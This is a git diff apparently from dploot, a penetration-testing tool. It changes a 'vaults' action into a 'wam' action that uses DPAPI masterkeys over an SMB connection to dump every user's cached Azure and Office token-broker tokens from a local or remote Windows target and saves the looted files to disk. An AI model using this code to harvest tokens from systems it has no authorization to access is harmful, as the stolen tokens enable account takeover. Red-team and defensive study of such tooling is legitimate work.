@@ -11,12 +11,12 @@ from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target, add_target_argument_group
 from dploot.lib.utils import dump_looted_files_to_disk, handle_outputdir_option
 from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
-from dploot.triage.vaults import VaultsTriage
+from dploot.triage.wam import WamTriage
 
-NAME = "vaults"
+NAME = "wam"
 
 
-class VaultsAction:
+class WamAction:
     def __init__(self, options: argparse.Namespace) -> None:
         self.options = options
         self.target = Target.from_options(options)
@@ -80,20 +80,20 @@ class VaultsAction:
                 if self.outputdir is not None:
                     dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)
 
-            def secret_callback(vault):
+            def token_callback(token):
                 if self.options.quiet:
-                    vault.dump_quiet()
+                    token.dump_quiet()
                 else:
-                    vault.dump()
+                    token.dump()
 
-            triage = VaultsTriage(
+            triage = WamTriage(
                 target=self.target,
                 conn=self.conn,
                 masterkeys=self.masterkeys,
-                per_vault_callback=secret_callback,
+                per_token_callback=token_callback,
             )
-            logging.info("Triage Vaults for ALL USERS\n")
-            triage.triage_vaults()
+            logging.info("Triage Office Token Broker Cache for ALL USERS\n")
+            triage.triage_wam()
             if self.outputdir is not None:
                 dump_looted_files_to_disk(self.outputdir, triage.looted_files)
         else:
@@ -109,16 +109,17 @@ class VaultsAction:
 
 
 def entry(options: argparse.Namespace) -> None:
-    a = VaultsAction(options)
+    a = WamAction(options)
     a.run()
 
 
 def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
     subparser = subparsers.add_parser(
-        NAME, help="Dump users Vaults blob from local or remote target"
+        NAME,
+        help="Dump users cached azure tokens from local or remote target",
     )
 
-    group = subparser.add_argument_group("vaults options")
+    group = subparser.add_argument_group("credentials options")
 
     group.add_argument(
         "-mkfile",
